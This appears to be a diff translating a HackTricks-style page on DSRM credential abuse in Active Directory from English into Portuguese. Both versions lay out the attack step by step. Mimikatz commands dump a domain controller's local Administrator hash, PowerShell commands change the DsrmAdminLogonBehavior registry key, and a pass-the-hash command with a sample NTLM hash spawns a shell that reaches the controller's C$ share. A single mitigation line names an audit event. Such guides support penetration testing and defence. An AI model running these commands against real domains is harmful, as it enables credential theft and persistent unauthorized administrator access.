@@ -1,35 +1,28 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-# DSRM Credentials
+# Credenciais DSRM
 
-There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.\
-First we need to **dump** the **hash** of the **local Administrator** user inside the DC:
-
+Há uma conta de **administrador local** dentro de cada **DC**. Tendo privilégios de administrador nesta máquina, você pode usar mimikatz para **extrair o hash do Administrador local**. Em seguida, modificando um registro para **ativar esta senha** para que você possa acessar remotamente este usuário Administrador local.\
+Primeiro, precisamos **extrair** o **hash** do usuário **Administrador local** dentro do DC:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-
-Then we need to check if that account will work, and if the registry key has the value "0" or it doesn't exist you need to **set it to "2"**:
-
+Então precisamos verificar se essa conta funcionará, e se a chave do registro tiver o valor "0" ou não existir, você precisa **defini-la como "2"**:
 ```bash
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-
-Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the "domain" used is just the name of the DC machine:**
-
+Então, usando um PTH você pode **listar o conteúdo de C$ ou até mesmo obter um shell**. Note que para criar uma nova sessão do powershell com esse hash na memória (para o PTH) **o "domínio" usado é apenas o nome da máquina DC:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
 ls \\dc-host-name\C$
 ```
+Mais informações sobre isso em: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
 
-More info about this in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) and [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
+## Mitigação
 
-## Mitigation
-
-- Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
+- ID do Evento 4657 - Auditoria de criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`
 
 {{#include ../../banners/hacktricks-training.md}}
-
